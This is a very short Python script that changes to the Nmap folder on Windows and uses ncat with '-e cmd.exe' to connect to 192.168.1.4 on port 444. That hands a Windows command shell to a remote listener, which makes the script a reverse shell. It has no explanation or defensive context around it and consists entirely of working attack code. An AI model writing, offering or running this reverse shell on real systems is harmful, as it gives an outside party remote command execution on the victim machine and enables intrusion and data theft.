import os

os.chdir("C:/Program Files (x86)/Nmap/")
os.system('cmd /k "ncat -nv 192.168.1.4 444 -e cmd.exe"')
